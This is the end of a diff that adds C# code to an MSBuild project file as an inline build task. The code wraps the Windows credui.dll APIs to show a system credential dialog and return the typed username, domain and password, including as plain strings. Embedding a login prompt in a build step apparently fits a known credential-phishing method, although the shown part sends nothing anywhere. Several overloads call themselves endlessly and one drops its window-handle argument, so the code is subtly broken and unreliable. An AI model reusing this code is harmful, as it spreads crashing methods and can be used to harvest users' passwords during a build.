+						return PromptForCredentials(Environment.UserDomainName, caption, message, hwndParent, userName, password);
+					}
+				}
+				public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message)
+				{
+					return PromptWithSecureString(caption, message, IntPtr.Zero);
+				}
+				public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message, IntPtr hwndParent)
+				{
+					return PromptWithSecureString(caption, message, IntPtr.Zero, null, null);
+				}
+				public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message, SecureString userName, SecureString password)
+				{
+					return PromptWithSecureString(caption, message, IntPtr.Zero, userName, password);
+				}
+				public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message, IntPtr hwndParent, SecureString userName, SecureString password)
+				{
+					if (Environment.OSVersion.Version.Major >= 6)
+					{
+						return PromptForWindowsCredentialsWithSecureString(caption, message, hwndParent, userName, password);
+					}
+					else
+					{
+						return PromptForCredentialsWithSecureString(Environment.UserDomainName, caption, message, hwndParent, userName, password);
+					}
+				}
+				#region Method: PromptForWindowsCredentials
+				public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message)
+				{
+					return PromptForWindowsCredentials(caption, message, String.Empty, String.Empty);
+				}
+				public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message, IntPtr hwndParent)
+				{
+					return PromptForWindowsCredentials(caption, message, hwndParent);
+				}
+				public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message, String userName, String password)
+				{
+					return PromptForWindowsCredentials(caption, message, IntPtr.Zero, userName, password);
+				}
+				public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message, IntPtr hwndParent, String userName, String password)
+				{
+					PromptForWindowsCredentialsOptions options = new PromptForWindowsCredentialsOptions(caption, message)
+					{
+						HwndParent = hwndParent,
+						IsSaveChecked = false
+					};
+					return PromptForWindowsCredentials(options, userName, password);
+				}
+				public static PromptCredentialsResult PromptForWindowsCredentials(PromptForWindowsCredentialsOptions options, String userName, String password)
+				{
+					if (String.IsNullOrEmpty(userName) && String.IsNullOrEmpty(password))
+						return PromptForWindowsCredentialsInternal<PromptCredentialsResult>(options, null, null);
+					using (SecureString userNameS = new SecureString())
+					using (SecureString passwordS = new SecureString())
+					{
+						if (!String.IsNullOrEmpty(userName))
+						{
+							foreach (var c in userName)
+								userNameS.AppendChar(c);
+						}
+						if (!String.IsNullOrEmpty(password))
+						{
+							foreach (var c in password)
+								passwordS.AppendChar(c);
+						}
+						userNameS.MakeReadOnly();
+						passwordS.MakeReadOnly();
+						return PromptForWindowsCredentialsInternal<PromptCredentialsResult>(options, userNameS, passwordS);
+					}
+				}
+				public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message)
+				{
+					return PromptForWindowsCredentialsWithSecureString(caption, message, IntPtr.Zero, null, null);
+				}
+				public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message, IntPtr hwndParent)
+				{
+					return PromptForWindowsCredentialsWithSecureString(caption, message, hwndParent, null, null);
+				}
+				public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message, SecureString userName, SecureString password)
+				{
+					return PromptForWindowsCredentialsWithSecureString(caption, message, IntPtr.Zero, userName, password);
+				}
+				public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message, IntPtr hwndParent, SecureString userName, SecureString password)
+				{
+					PromptForWindowsCredentialsOptions options = new PromptForWindowsCredentialsOptions(caption, message)
+					{
+						HwndParent = hwndParent,
+						IsSaveChecked = false
+					};
+					return PromptForWindowsCredentialsWithSecureString(options, userName, password);
+				}
+				public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(PromptForWindowsCredentialsOptions options, SecureString userName, SecureString password)
+				{
+					return PromptForWindowsCredentialsInternal<PromptCredentialsSecureStringResult>(options, userName, password);
+				}
+				private static T PromptForWindowsCredentialsInternal<T>(PromptForWindowsCredentialsOptions options, SecureString userName, SecureString password) where T : class, IPromptCredentialsResult
+				{
+					NativeMethods.CREDUI_INFO creduiInfo = new NativeMethods.CREDUI_INFO()
+					{
+						pszCaptionText = options.Caption,
+						pszMessageText = options.Message,
+						hwndParent = options.HwndParent,
+						hbmBanner = options.HbmBanner
+					};
+					PromptForWindowsCredentialsFlag credentialsFlag = options.Flags;
+					IntPtr userNamePtr = IntPtr.Zero;
+					IntPtr passwordPtr = IntPtr.Zero;
+					Int32 authPackage = 0;
+					IntPtr outAuthBuffer = IntPtr.Zero;
+					Int32 outAuthBufferSize = 0;
+					IntPtr inAuthBuffer = IntPtr.Zero;
+					Int32 inAuthBufferSize = 0;
+					Boolean save = options.IsSaveChecked;
+					try
+					{
+						if (userName != null || password != null)
+						{
+							if (userName == null)
+								userName = new SecureString();
+							if (password == null)
+								password = new SecureString();
+							userNamePtr = Marshal.SecureStringToCoTaskMemUnicode(userName);
+							passwordPtr = Marshal.SecureStringToCoTaskMemUnicode(password);
+						}
+						if (userNamePtr != IntPtr.Zero || passwordPtr != IntPtr.Zero)
+						{
+							inAuthBufferSize = 1024;
+							inAuthBuffer = Marshal.AllocCoTaskMem(inAuthBufferSize);
+							if (
+								!NativeMethods.CredPackAuthenticationBuffer(0x00, userNamePtr, passwordPtr, inAuthBuffer,
+																	ref inAuthBufferSize))
+							{
+								var win32Error = Marshal.GetLastWin32Error();
+								if (win32Error == 122 /*ERROR_INSUFFICIENT_BUFFER*/)
+								{
+									inAuthBuffer = Marshal.ReAllocCoTaskMem(inAuthBuffer, inAuthBufferSize);
+									if (
+										!NativeMethods.CredPackAuthenticationBuffer(0x00, userNamePtr, passwordPtr, inAuthBuffer,
+																			ref inAuthBufferSize))
+									{
+										throw new Win32Exception(Marshal.GetLastWin32Error());
+									}
+								}
+								else
+								{
+									throw new Win32Exception(win32Error);
+								}
+							}
+						}
+						var retVal = NativeMethods.CredUIPromptForWindowsCredentials(creduiInfo,
+																			 options.AuthErrorCode,
+																			 ref authPackage,
+																			 inAuthBuffer,
+																			 inAuthBufferSize,
+																			 out outAuthBuffer,
+																			 out outAuthBufferSize,
+																			 ref save,
+																			 credentialsFlag
+																			 );
+						switch (retVal)
+						{
+							case NativeMethods.CredUIPromptReturnCode.Cancelled:
+								return null;
+							case NativeMethods.CredUIPromptReturnCode.Success:
+								break;
+							default:
+								throw new Win32Exception((Int32)retVal);
+						}
+						if (typeof(T) == typeof(PromptCredentialsSecureStringResult))
+						{
+							var credResult = NativeMethods.CredUnPackAuthenticationBufferWrapSecureString(true, outAuthBuffer, outAuthBufferSize);
+							credResult.IsSaveChecked = save;
+							return credResult as T;
+						}
+						else
+						{
+							var credResult = NativeMethods.CredUnPackAuthenticationBufferWrap(true, outAuthBuffer, outAuthBufferSize);
+							credResult.IsSaveChecked = save;
+							return credResult as T;
+						}
+					}
+					finally
+					{
+						if (inAuthBuffer != IntPtr.Zero)
+							Marshal.ZeroFreeCoTaskMemUnicode(inAuthBuffer);
+						if (outAuthBuffer != IntPtr.Zero)
+							Marshal.ZeroFreeCoTaskMemUnicode(outAuthBuffer);
+						if (userNamePtr != IntPtr.Zero)
+							Marshal.ZeroFreeCoTaskMemUnicode(userNamePtr);
+						if (passwordPtr != IntPtr.Zero)
+							Marshal.ZeroFreeCoTaskMemUnicode(passwordPtr);
+					}
+				}
+				#endregion
+				#region Method: PromptForCredentials
+				public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message)
+				{
+					return PromptForCredentials(new PromptForCredentialsOptions(targetName, caption, message));
+				}
+				public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message, IntPtr hwndParent)
+				{
+					return PromptForCredentials(targetName, caption, message, hwndParent);
+				}
+				public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message, String userName, String password)
+				{
+					return PromptForCredentials(targetName, caption, message, IntPtr.Zero, userName, password);
+				}
+				public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message, IntPtr hwndParent, String userName, String password)
+				{
+					return PromptForCredentials(new PromptForCredentialsOptions(targetName, caption, message) { HwndParent = hwndParent }, userName, password);
+				}
+				public static PromptCredentialsResult PromptForCredentials(PromptForCredentialsOptions options)
+				{
+					return PromptForCredentials(options, null, null);
+				}
+				public static PromptCredentialsResult PromptForCredentials(PromptForCredentialsOptions options, String userName, String password)
+				{
+					using (SecureString userNameS = new SecureString())
+					using (SecureString passwordS = new SecureString())
+					{
+						if (!String.IsNullOrEmpty(userName))
+						{
+							foreach (var c in userName)
+								userNameS.AppendChar(c);
+						}
+						if (!String.IsNullOrEmpty(password))
+						{
+							foreach (var c in password)
+								passwordS.AppendChar(c);
+						}
+						userNameS.MakeReadOnly();
+						passwordS.MakeReadOnly();
+						return PromptForCredentialsInternal<PromptCredentialsResult>(options, userNameS, passwordS);
+					}
+				}
+				public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message)
+				{
+					return PromptForCredentialsWithSecureString(new PromptForCredentialsOptions(targetName, caption, message));
+				}
+				public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message, IntPtr hwndParent)
+				{
+					return PromptForCredentialsWithSecureString(targetName, caption, message, hwndParent, null, null);
+				}
+				public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message, SecureString userName, SecureString password)
+				{
+					return PromptForCredentialsWithSecureString(targetName, caption, message, IntPtr.Zero, userName, password);
+				}
+				public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message, IntPtr hwndParent, SecureString userName, SecureString password)
+				{
+					return PromptForCredentialsWithSecureString(new PromptForCredentialsOptions(targetName, caption, message) { HwndParent = hwndParent }, userName, password);
+				}
+				public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(PromptForCredentialsOptions options)
+				{
+					return PromptForCredentialsInternal<PromptCredentialsSecureStringResult>(options, null, null);
+				}
+				public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(PromptForCredentialsOptions options, SecureString userName, SecureString password)
+				{
+					return PromptForCredentialsInternal<PromptCredentialsSecureStringResult>(options, userName, password);
+				}
+				private static T PromptForCredentialsInternal<T>(PromptForCredentialsOptions options, SecureString userName, SecureString password) where T : class, IPromptCredentialsResult
+				{
+					if (options == null)
+						throw new ArgumentNullException("options");
+					if (userName != null && (userName.Length > NativeMethods.CREDUI_MAX_USERNAME_LENGTH))
+						throw new ArgumentOutOfRangeException("userName", "CREDUI_MAX_USERNAME_LENGTH");
+					if (password != null && (password.Length > NativeMethods.CREDUI_MAX_PASSWORD_LENGTH))
+						throw new ArgumentOutOfRangeException("password", "CREDUI_MAX_PASSWORD_LENGTH");
+					NativeMethods.CREDUI_INFO creduiInfo = new NativeMethods.CREDUI_INFO()
+					{
+						pszCaptionText = options.Caption,
+						pszMessageText = options.Message,
+						hwndParent = options.HwndParent,
+						hbmBanner = options.HbmBanner
+					};
+					IntPtr userNamePtr = IntPtr.Zero;
+					IntPtr passwordPtr = IntPtr.Zero;
+					Boolean save = options.IsSaveChecked;
+					try
+					{
+						if (userName == null)
+						{
+							userNamePtr = Marshal.AllocCoTaskMem((NativeMethods.CREDUI_MAX_USERNAME_LENGTH + 1) * sizeof(Int16));
+							Marshal.WriteInt16(userNamePtr, 0, 0x00);
+						}
+						else
+						{
+							userNamePtr = Marshal.SecureStringToCoTaskMemUnicode(userName);
+							userNamePtr = Marshal.ReAllocCoTaskMem(userNamePtr, (NativeMethods.CREDUI_MAX_USERNAME_LENGTH + 1) * sizeof(Int16));
+						}
+						if (password == null)
+						{
+							passwordPtr = Marshal.AllocCoTaskMem((NativeMethods.CREDUI_MAX_PASSWORD_LENGTH + 1) * sizeof(Int16));
+							Marshal.WriteInt16(passwordPtr, 0, 0x00);
+						}
+						else
+						{
+							passwordPtr = Marshal.SecureStringToCoTaskMemUnicode(password);
+							passwordPtr = Marshal.ReAllocCoTaskMem(passwordPtr, (NativeMethods.CREDUI_MAX_PASSWORD_LENGTH + 1) * sizeof(Int16));
+						}
+						Marshal.WriteInt16(userNamePtr, NativeMethods.CREDUI_MAX_USERNAME_LENGTH * sizeof(Int16), 0x00);
+						Marshal.WriteInt16(passwordPtr, NativeMethods.CREDUI_MAX_PASSWORD_LENGTH * sizeof(Int16), 0x00);
+						var retVal = NativeMethods.CredUIPromptForCredentials(creduiInfo,
+																	  options.TargetName,
+																	  IntPtr.Zero,
+																	  options.AuthErrorCode,
+																	  userNamePtr,
+																	  NativeMethods.CREDUI_MAX_USERNAME_LENGTH,
+																	  passwordPtr,
+																	  NativeMethods.CREDUI_MAX_PASSWORD_LENGTH,
+																	  ref save,
+																	  options.Flags);
+						switch (retVal)
+						{
+							case NativeMethods.CredUIPromptReturnCode.Cancelled:
+								return null;
+							case NativeMethods.CredUIPromptReturnCode.InvalidParameter:
+								throw new Win32Exception((Int32)retVal);
+							case NativeMethods.CredUIPromptReturnCode.InvalidFlags:
+								throw new Win32Exception((Int32)retVal);
+							case NativeMethods.CredUIPromptReturnCode.Success:
+								break;
+							default:
+								throw new Win32Exception((Int32)retVal);
+						}
+						if (typeof(T) == typeof(PromptCredentialsSecureStringResult))
+						{
+							return new PromptCredentialsSecureStringResult
+							{
+								UserName = NativeMethods.PtrToSecureString(userNamePtr),
+								Password = NativeMethods.PtrToSecureString(passwordPtr),
+								IsSaveChecked = save
+							} as T;
+						}
+						else
+						{
+							return new PromptCredentialsResult
+							{
+								UserName = Marshal.PtrToStringUni(userNamePtr),
+								Password = Marshal.PtrToStringUni(passwordPtr),
+								IsSaveChecked = save
+							} as T;
+						}
+					}
+					finally
+					{
+						if (userNamePtr != IntPtr.Zero)
+							Marshal.ZeroFreeCoTaskMemUnicode(userNamePtr);
+						if (passwordPtr != IntPtr.Zero)
+							Marshal.ZeroFreeCoTaskMemUnicode(passwordPtr);
+					}
+				}
+				#endregion
+				[Flags]
+				public enum PromptForWindowsCredentialsFlag
+				{
+					CREDUIWIN_GENERIC = 0x00000001,
+					CREDUIWIN_CHECKBOX = 0x00000002,
+					CREDUIWIN_AUTHPACKAGE_ONLY = 0x00000010,
+					CREDUIWIN_IN_CRED_ONLY = 0x00000020,
+					CREDUIWIN_ENUMERATE_ADMINS = 0x00000100,
+					CREDUIWIN_ENUMERATE_CURRENT_USER = 0x00000200,
+					CREDUIWIN_SECURE_PROMPT = 0x00001000,
+					CREDUIWIN_PACK_32_WOW = 0x10000000
+				}
+				[Flags]
+				public enum PromptForCredentialsFlag
+				{
+					CREDUI_FLAGS_INCORRECT_PASSWORD = 0x00001,
+					CREDUI_FLAGS_DO_NOT_PERSIST = 0x00002,
+					CREDUI_FLAGS_REQUEST_ADMINISTRATOR = 0x00004,
+					CREDUI_FLAGS_EXCLUDE_CERTIFICATES = 0x00008,
+					CREDUI_FLAGS_REQUIRE_CERTIFICATE = 0x00010,
+					CREDUI_FLAGS_SHOW_SAVE_CHECK_BOX = 0x00040,
+					CREDUI_FLAGS_ALWAYS_SHOW_UI = 0x00080,
+					CREDUI_FLAGS_REQUIRE_SMARTCARD = 0x00100,
+					CREDUI_FLAGS_PASSWORD_ONLY_OK = 0x00200,
+					CREDUI_FLAGS_VALIDATE_USERNAME = 0x00400,
+					CREDUI_FLAGS_COMPLETE_USERNAME = 0x00800,
+					CREDUI_FLAGS_PERSIST = 0x01000,
+					CREDUI_FLAGS_SERVER_CREDENTIAL = 0x04000,
+					CREDUI_FLAGS_EXPECT_CONFIRMATION = 0x20000,
+					CREDUI_FLAGS_GENERIC_CREDENTIALS = 0x40000,
+					CREDUI_FLAGS_USERNAME_TARGET_CREDENTIALS = 0x80000,
+					CREDUI_FLAGS_KEEP_USERNAME = 0x100000
+				}
+				public class PromptForWindowsCredentialsOptions
+				{
+					private String _caption;
+					private String _message;
+					public String Caption
+					{
+						get { return _caption; }
+						set
+						{
+							if (value.Length > NativeMethods.CREDUI_MAX_CAPTION_LENGTH)
+								throw new ArgumentOutOfRangeException("value");
+							_caption = value;
+						}
+					}
+					public String Message
+					{
+						get { return _message; }
+						set
+						{
+							if (value.Length > NativeMethods.CREDUI_MAX_MESSAGE_LENGTH)
+								throw new ArgumentOutOfRangeException("value");
+							_message = value;
+						}
+					}
+					public IntPtr HwndParent { get; set; }
+					public IntPtr HbmBanner { get; set; }
+					public Boolean IsSaveChecked { get; set; }
+					public PromptForWindowsCredentialsFlag Flags { get; set; }
+					public Int32 AuthErrorCode { get; set; }
+					public PromptForWindowsCredentialsOptions(String caption, String message)
+					{
+						if (String.IsNullOrEmpty(caption))
+							throw new ArgumentNullException("caption");
+						if (String.IsNullOrEmpty(message))
+							throw new ArgumentNullException("message");
+						Caption = caption;
+						Message = message;
+						Flags = PromptForWindowsCredentialsFlag.CREDUIWIN_GENERIC;
+					}
+				}
+				public class PromptForCredentialsOptions
+				{
+					private String _caption;
+					private String _message;
+					public String Caption
+					{
+						get { return _caption; }
+						set
+						{
+							if (value.Length > NativeMethods.CREDUI_MAX_CAPTION_LENGTH)
+								throw new ArgumentOutOfRangeException("value");
+							_caption = value;
+						}
+					}
+					public String Message
+					{
+						get { return _message; }
+						set
+						{
+							if (value.Length > NativeMethods.CREDUI_MAX_MESSAGE_LENGTH)
+								throw new ArgumentOutOfRangeException("value");
+							_message = value;
+						}
+					}
+					public String TargetName { get; set; }
+					public IntPtr HwndParent { get; set; }
+					public IntPtr HbmBanner { get; set; }
+					public Boolean IsSaveChecked { get; set; }
+					public PromptForCredentialsFlag Flags { get; set; }
+					public Int32 AuthErrorCode { get; set; }
+					public PromptForCredentialsOptions(String targetName, String caption, String message)
+					{
+						if (String.IsNullOrEmpty(caption))
+							throw new ArgumentNullException("caption");
+						if (String.IsNullOrEmpty(message))
+							throw new ArgumentNullException("message");
+
+						TargetName = targetName;
+						Caption = caption;
+						Message = message;
+						Flags = PromptForCredentialsFlag.CREDUI_FLAGS_GENERIC_CREDENTIALS | PromptForCredentialsFlag.CREDUI_FLAGS_DO_NOT_PERSIST;
+					}
+				}
+				private static class NativeMethods
+				{
+					public const Int32 CREDUI_MAX_MESSAGE_LENGTH = 32767;
+					public const Int32 CREDUI_MAX_CAPTION_LENGTH = 128;
+					public const Int32 CRED_MAX_USERNAME_LENGTH = (256 + 1 + 256);
+					public const Int32 CREDUI_MAX_USERNAME_LENGTH = CRED_MAX_USERNAME_LENGTH;
+					public const Int32 CREDUI_MAX_PASSWORD_LENGTH = (512 / 2);
+					public enum CredUIPromptReturnCode
+					{
+						Success = 0,
+						Cancelled = 1223,
+						InvalidParameter = 87,
+						InvalidFlags = 1004
+					}
+					[StructLayout(LayoutKind.Sequential)]
+					public class CREDUI_INFO
+					{
+						public Int32 cbSize;
+						public IntPtr hwndParent;
+						[MarshalAs(UnmanagedType.LPWStr)]
+						public String pszMessageText;
+						[MarshalAs(UnmanagedType.LPWStr)]
+						public String pszCaptionText;
+						public IntPtr hbmBanner;
+						public CREDUI_INFO()
+						{
+							cbSize = Marshal.SizeOf(typeof(CREDUI_INFO));
+						}
+					}
+					[DllImport("credui.dll", CharSet = CharSet.Unicode)]
+					public static extern CredUIPromptReturnCode CredUIPromptForCredentials(
+						CREDUI_INFO pUiInfo,
+						String pszTargetName,
+						IntPtr Reserved,
+						Int32 dwAuthError,
+						IntPtr pszUserName,
+						Int32 ulUserNameMaxChars,
+						IntPtr pszPassword,
+						Int32 ulPasswordMaxChars,
+						ref Boolean pfSave,
+						PromptForCredentialsFlag dwFlags
+					);
+					[DllImport("credui.dll", CharSet = CharSet.Unicode)]
+					public static extern CredUIPromptReturnCode
+					CredUIPromptForWindowsCredentials(
+						CREDUI_INFO pUiInfo,
+						Int32 dwAuthError,
+						ref Int32 pulAuthPackage,
+						IntPtr pvInAuthBuffer,
+						Int32 ulInAuthBufferSize,
+						out IntPtr ppvOutAuthBuffer,
+						out Int32 pulOutAuthBufferSize,
+						ref Boolean pfSave,
+						PromptForWindowsCredentialsFlag dwFlags
+					);
+					[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+					public static extern Boolean CredPackAuthenticationBuffer(
+						Int32 dwFlags,
+						String pszUserName,
+						String pszPassword,
+						IntPtr pPackedCredentials,
+						ref Int32 pcbPackedCredentials
+					);
+					[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+					public static extern Boolean CredPackAuthenticationBuffer(
+						Int32 dwFlags,
+						IntPtr pszUserName,
+						IntPtr pszPassword,
+						IntPtr pPackedCredentials,
+						ref Int32 pcbPackedCredentials
+					);
+					[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+					public static extern Boolean CredUnPackAuthenticationBuffer(
+						Int32 dwFlags,
+						IntPtr pAuthBuffer,
+						Int32 cbAuthBuffer,
+						StringBuilder pszUserName,
+						ref Int32 pcchMaxUserName,
+						StringBuilder pszDomainName,
+						ref Int32 pcchMaxDomainame,
+						StringBuilder pszPassword,
+						ref Int32 pcchMaxPassword
+					);
+					[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+					public static extern Boolean CredUnPackAuthenticationBuffer(
+						Int32 dwFlags,
+						IntPtr pAuthBuffer,
+						Int32 cbAuthBuffer,
+						IntPtr pszUserName,
+						ref Int32 pcchMaxUserName,
+						IntPtr pszDomainName,
+						ref Int32 pcchMaxDomainame,
+						IntPtr pszPassword,
+						ref Int32 pcchMaxPassword
+					);
+					public static PromptCredentialsResult CredUnPackAuthenticationBufferWrap(Boolean decryptProtectedCredentials, IntPtr authBufferPtr, Int32 authBufferSize)
+					{
+						StringBuilder sbUserName = new StringBuilder(255);
+						StringBuilder sbDomainName = new StringBuilder(255);
+						StringBuilder sbPassword = new StringBuilder(255);
+						Int32 userNameSize = sbUserName.Capacity;
+						Int32 domainNameSize = sbDomainName.Capacity;
+						Int32 passwordSize = sbPassword.Capacity;
+						//#define CRED_PACK_PROTECTED_CREDENTIALS      0x1
+						//#define CRED_PACK_WOW_BUFFER                 0x2
+						//#define CRED_PACK_GENERIC_CREDENTIALS        0x4
+						Boolean result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
+																		authBufferPtr,
+																		authBufferSize,
+																		sbUserName,
+																		ref userNameSize,
+																		sbDomainName,
+																		ref domainNameSize,
+																		sbPassword,
+																		ref passwordSize
+																		);
+						if (!result)
+						{
+							var win32Error = Marshal.GetLastWin32Error();
+							if (win32Error == 122 /*ERROR_INSUFFICIENT_BUFFER*/)
+							{
+								sbUserName.Capacity = userNameSize;
+								sbPassword.Capacity = passwordSize;
+								sbDomainName.Capacity = domainNameSize;
+								result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
+																		authBufferPtr,
+																		authBufferSize,
+																		sbUserName,
+																		ref userNameSize,
+																		sbDomainName,
+																		ref domainNameSize,
+																		sbPassword,
+																		ref passwordSize
+																		);
+								if (!result)
+								{
+									throw new Win32Exception(Marshal.GetLastWin32Error());
+								}
+							}
+							else
+							{
+								throw new Win32Exception(win32Error);
+							}
+						}
+						return new PromptCredentialsResult
+						{
+							UserName = sbUserName.ToString(),
+							DomainName = sbDomainName.ToString(),
+							Password = sbPassword.ToString()
+						};
+					}
+					public static PromptCredentialsSecureStringResult CredUnPackAuthenticationBufferWrapSecureString(Boolean decryptProtectedCredentials, IntPtr authBufferPtr, Int32 authBufferSize)
+					{
+						Int32 userNameSize = 255;
+						Int32 domainNameSize = 255;
+						Int32 passwordSize = 255;
+						IntPtr userNamePtr = IntPtr.Zero;
+						IntPtr domainNamePtr = IntPtr.Zero;
+						IntPtr passwordPtr = IntPtr.Zero;
+						try
+						{
+							userNamePtr = Marshal.AllocCoTaskMem(userNameSize);
+							domainNamePtr = Marshal.AllocCoTaskMem(domainNameSize);
+							passwordPtr = Marshal.AllocCoTaskMem(passwordSize);
+							//#define CRED_PACK_PROTECTED_CREDENTIALS      0x1
+							//#define CRED_PACK_WOW_BUFFER                 0x2
+							//#define CRED_PACK_GENERIC_CREDENTIALS        0x4
+							Boolean result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
+																			authBufferPtr,
+																			authBufferSize,
+																			userNamePtr,
+																			ref userNameSize,
+																			domainNamePtr,
+																			ref domainNameSize,
+																			passwordPtr,
+																			ref passwordSize
+																			);
+							if (!result)
+							{
+								var win32Error = Marshal.GetLastWin32Error();
+								if (win32Error == 122 /*ERROR_INSUFFICIENT_BUFFER*/)
+								{
+									userNamePtr = Marshal.ReAllocCoTaskMem(userNamePtr, userNameSize);
+									domainNamePtr = Marshal.ReAllocCoTaskMem(domainNamePtr, domainNameSize);
+									passwordPtr = Marshal.ReAllocCoTaskMem(passwordPtr, passwordSize);
+									result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
+																			authBufferPtr,
+																			authBufferSize,
+																			userNamePtr,
+																			ref userNameSize,
+																			domainNamePtr,
+																			ref domainNameSize,
+																			passwordPtr,
+																			ref passwordSize);
+									if (!result)
+									{
+										throw new Win32Exception(Marshal.GetLastWin32Error());
+									}
+								}
+								else
+								{
+									throw new Win32Exception(win32Error);
+								}
+							}
+							return new PromptCredentialsSecureStringResult
+							{
+								UserName = PtrToSecureString(userNamePtr, userNameSize),
+								DomainName = PtrToSecureString(domainNamePtr, domainNameSize),
+								Password = PtrToSecureString(passwordPtr, passwordSize)
+							};
+						}
+						finally
+						{
+							if (userNamePtr != IntPtr.Zero)
+								Marshal.ZeroFreeCoTaskMemUnicode(userNamePtr);
+							if (domainNamePtr != IntPtr.Zero)
+								Marshal.ZeroFreeCoTaskMemUnicode(domainNamePtr);
+							if (passwordPtr != IntPtr.Zero)
+								Marshal.ZeroFreeCoTaskMemUnicode(passwordPtr);
+						}
+					}
+					#region Utility Methods
+					public static SecureString PtrToSecureString(IntPtr p)
+					{
+						SecureString s = new SecureString();
+						Int32 i = 0;
+						while (true)
+						{
+							Char c = (Char)Marshal.ReadInt16(p, ((i++) * sizeof(Int16)));
+							if (c == '\u0000')
+								break;
+							s.AppendChar(c);
+						}
+						s.MakeReadOnly();
+						return s;
+					}
+					public static SecureString PtrToSecureString(IntPtr p, Int32 length)
+					{
+						SecureString s = new SecureString();
+						for (var i = 0; i < length; i++)
+							s.AppendChar((Char)Marshal.ReadInt16(p, i * sizeof(Int16)));
+						s.MakeReadOnly();
+						return s;
+					}
+					#endregion
+				}
+			}
+			public interface IPromptCredentialsResult
+			{
+			}
+			public class PromptCredentialsResult : IPromptCredentialsResult
+			{
+				public String UserName { get; internal set; }
+				public String DomainName { get; internal set; }
+				public String Password { get; internal set; }
+				public Boolean IsSaveChecked { get; set; }
+			}
+			public class PromptCredentialsSecureStringResult : IPromptCredentialsResult
+			{
+				public SecureString UserName { get; internal set; }
+				public SecureString DomainName { get; internal set; }
+				public SecureString Password { get; internal set; }
+				public Boolean IsSaveChecked { get; set; }
+			}	
+			public static class ExtensionMethods
+			{
+				public static SecureString ToSecureString(this string src)
+				{
+					SecureString result = new SecureString();
+					src.ToCharArray().ToList().ForEach(c => result.AppendChar(c));
+					return result;
+				}
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
